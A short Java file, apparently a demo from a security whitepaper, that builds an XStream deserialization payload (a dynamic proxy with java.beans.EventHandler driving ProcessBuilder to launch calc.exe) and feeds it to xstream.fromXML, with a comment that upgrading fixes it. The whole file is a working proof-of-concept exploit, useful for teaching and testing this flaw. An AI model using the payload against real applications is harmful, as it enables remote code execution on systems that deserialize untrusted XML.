package com.securitywhitepapers.xxe;

import javax.xml.stream.XMLStreamException;

public class XStream {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws XMLStreamException {
        com.thoughtworks.xstream.XStream xstream = new com.thoughtworks.xstream.XStream();
        
        //payload to open calc.exe
        String payload = "<sorted-set>" +
                "<string>foo</string>" +
                "<dynamic-proxy>" +
                "<interface>java.lang.Comparable</interface>" +
                "<handler class=\"java.beans.EventHandler\">" +
                " <target class=\"java.lang.ProcessBuilder\">" +
                " <command>" +
                " <string>calc.exe</string>" +
                " </command>" +
                " </target>" +
                " <action>start</action>" +
                "</handler>" +
                "</dynamic-proxy>" +
                "</sorted-set>";

        
        //How to fix it: update version
        Contact expl = (Contact) xstream.fromXML(payload);

    }

}
